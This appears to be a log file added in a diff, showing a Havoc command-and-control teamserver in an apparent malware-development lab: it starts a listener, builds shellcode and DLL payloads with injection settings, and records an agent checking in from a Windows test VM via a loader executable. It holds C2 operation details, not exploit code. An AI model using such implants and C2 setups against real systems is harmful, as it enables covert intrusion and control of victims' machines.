@@ -1,0 +1,90 @@
+              _______           _______  _______ 
+    │\     /│(  ___  )│\     /│(  ___  )(  ____ \
+    │ )   ( ││ (   ) ││ )   ( ││ (   ) ││ (    \/
+    │ (___) ││ (___) ││ │   │ ││ │   │ ││ │      
+    │  ___  ││  ___  │( (   ) )│ │   │ ││ │      
+    │ (   ) ││ (   ) │ \ \_/ / │ │   │ ││ │      
+    │ )   ( ││ )   ( │  \   /  │ (___) ││ (____/\
+    │/     \││/     \│   \_/   (_______)(_______/
+
+  	 pwn and elevate until it's done
+
+[06:38:01] [DBUG] [cmd.init.func2:59]: Debug mode enabled
+[06:38:01] [INFO] Havoc Framework [Version: 0.7] [CodeName: Bites The Dust]
+[06:38:01] [INFO] Havoc profile: ./profiles/havoc.yaotl
+[06:38:01] [INFO] Build: 
+ - Compiler x64 : data/x86_64-w64-mingw32-cross/bin/x86_64-w64-mingw32-gcc
+ - Compiler x86 : data/i686-w64-mingw32-cross/bin/i686-w64-mingw32-gcc
+ - Nasm         : /usr/bin/nasm
+[06:38:01] [INFO] Time: 12/07/2024 06:38:01
+[06:38:01] [INFO] Teamserver logs saved under: data/loot/2024.07.12._06:38:01
+[06:38:01] [DBUG] [server.(*Teamserver).Start:53]: Starting teamserver...
+[06:38:01] [INFO] Starting Teamserver on wss://0.0.0.0:40056
+[06:38:01] [INFO] [SERVICE] starting service handle on wss://0.0.0.0:40056/service-endpoint
+[06:38:01] [INFO] Opens existing database: data/teamserver.db
+[06:38:01] [DBUG] [certs.HTTPSGenerateRSACertificate:301]: Generating TLS certificate (RSA) for '0.0.0.0' ...
+[06:38:01] [INFO] Starting 1 listeners from last session
+[06:38:01] [DBUG] [handlers.(*HTTP).Start:204]: Setup HTTP/s Server
+[06:38:01] [INFO] Started "1" listener: http://192.168.17.137:80
+[06:38:01] [INFO] Restored 1 agents from last session
+[06:38:01] [DBUG] [server.(*Teamserver).Start:492]: Wait til the server shutdown
+[06:38:01] [DBUG] [handlers.handleDemonAgent:84]: Agent: 6462235e, Command: DEMON_INIT
+[06:38:01] [DBUG] [packer.(*Packer).Build:87]: No Aes Key specified
+[06:38:01] [DBUG] [handlers.handleDemonAgent:95]: reconnected 8233bf80
+[06:38:01] [DBUG] [certs.generateCertificate:223]: Valid from 2023-10-11 06:38:01.598607988 -0400 EDT to 2026-10-10 06:38:01.598607988 -0400 EDT
+[06:38:01] [DBUG] [certs.generateCertificate:228]: Serial Number: 103077173882913946179585819776417990050
+[06:38:01] [DBUG] [certs.generateCertificate:234]: Authority certificate
+[06:38:01] [DBUG] [certs.generateCertificate:247]: ExtKeyUsage = [1 2]
+[06:38:01] [DBUG] [certs.generateCertificate:263]: Certificate authenticates IP address: 0.0.0.0
+[06:38:01] [DBUG] [certs.generateCertificate:278]: Certificate is an AUTHORITY
+[06:38:04] [DBUG] [server.(*Teamserver).ClientAuthenticate:658]: Found User: 5pider
+[06:38:04] [DBUG] [server.(*Teamserver).ClientAuthenticate:665]: User 5pider is authenticated
+[06:38:04] [GOOD] User <5pider> Authenticated
+[06:38:08] [DBUG] [builder.NewBuilder:179]: Payload Builder: Enable Debug Mode false
+[06:38:08] [DBUG] [server.(*Teamserver).DispatchEvent.func18:882]: Windows Shellcode
+[06:38:08] [DBUG] [builder.(*Builder).PatchConfig:579]: map[Amsi/Etw Patch:None Indirect Syscall:false Injection:map[Alloc:Native/Syscall Execute:Native/Syscall Spawn32:C:\Windows\SysWOW64\notepad.exe Spawn64:C:\Windows\System32\notepad.exe] Jitter:15 Proxy Loading:None (LdrLoadDll) Sleep:2 Sleep Jmp Gadget:None Sleep Technique:WaitForSingleObjectEx Stack Duplication:false]
+[06:38:08] [DBUG] [builder.(*Builder).PatchConfig:915]: Host => 192.168.17.137
+[06:38:08] [DBUG] [builder.(*Builder).PatchConfig:940]: host only
+[06:38:08] [DBUG] [builder.(*Builder).PatchConfig:971]: 
+[06:38:08] [DBUG] [builder.(*Builder).PatchConfig:982]: 
+[06:38:08] [DBUG] [builder.(*Builder).Build:331]: /usr/bin/nasm -f win64 src/asm/Spoof.x64.asm -o /tmp/857d53118f/3f7a76914d.o
+[06:38:08] [DBUG] [builder.(*Builder).Build:331]: /usr/bin/nasm -f win64 src/asm/Syscall.x64.asm -o /tmp/857d53118f/e751eb0f9b.o
+[06:38:08] [DBUG] [builder.(*Builder).Build:389]: Compile dll and prepend shellcode to it.
+[06:38:08] [DBUG] [builder.NewBuilder:179]: Payload Builder: Enable Debug Mode false
+[06:38:08] [DBUG] [builder.(*Builder).SetPatchConfig:465]: Set Patch config from Profile
+[06:38:08] [DBUG] [builder.(*Builder).PatchConfig:579]: map[Amsi/Etw Patch:None Indirect Syscall:false Injection:map[Alloc:Native/Syscall Execute:Native/Syscall Spawn32:C:\Windows\SysWOW64\notepad.exe Spawn64:C:\Windows\System32\notepad.exe] Jitter:15 Proxy Loading:None (LdrLoadDll) Sleep:2 Sleep Jmp Gadget:None Sleep Technique:WaitForSingleObjectEx Stack Duplication:false]
+[06:38:08] [DBUG] [builder.(*Builder).PatchConfig:915]: Host => 192.168.17.137
+[06:38:08] [DBUG] [builder.(*Builder).PatchConfig:940]: host only
+[06:38:08] [DBUG] [builder.(*Builder).PatchConfig:971]: 
+[06:38:08] [DBUG] [builder.(*Builder).PatchConfig:982]: 
+[06:38:08] [DBUG] [builder.(*Builder).Build:331]: /usr/bin/nasm -f win64 src/asm/Spoof.x64.asm -o /tmp/4b0b483c6e/8f6c7dde7e.o
+[06:38:08] [DBUG] [builder.(*Builder).Build:331]: /usr/bin/nasm -f win64 src/asm/Syscall.x64.asm -o /tmp/4b0b483c6e/4f22d0f4ae.o
+[06:38:08] [DBUG] [builder.(*Builder).Build:379]: Compile dll
+[06:39:05] [DBUG] [builder.(*Builder).Build:410]: Successful compiled Dll
+[06:39:12] [DBUG] [handlers.handleDemonAgent:262]: Agent does not exists. hope this is a register request
+[06:39:12] [DBUG] [agent.ParseDemonRegisterRequest:404]: Parsed DemonID: 54470806
+[06:39:12] [DBUG] [agent.ParseDemonRegisterRequest:412]: AgentID (54470806) == DemonID (54470806)
+
+[06:39:12] [DBUG] [agent.ParseDemonRegisterRequest:424]: 
+Hostname: WINDEV2401EVAL
+Username: User
+Domain  : 
+InternIP: 192.168.17.131
+ExternIP: 192.168.17.131
+
+[06:39:12] [DBUG] [agent.ParseDemonRegisterRequest:441]: 
+ProcessName : C:\Users\User\Desktop\WinDev\Maldev\Maldev2\RE_Loader\x64\Release\RE_Loader.exe
+ProcessPID  : 19520
+ProcessTID  : 15692
+ProcessPPID : 0
+ProcessArch : 2
+Elevated    : 0
+Base Address: 0x1f436830000
+
+[06:39:12] [DBUG] [agent.ParseDemonRegisterRequest:459]: 
+SleepDelay  : 2
+SleepJitter : 15
+
+[06:39:12] [DBUG] [agent.ParseDemonRegisterRequest:594]: Finished parsing demon
+[06:39:12] [DBUG] [packer.(*Packer).Build:87]: No Aes Key specified
+[06:39:12] [DBUG] [handlers.handleDemonAgent:295]: Finished request
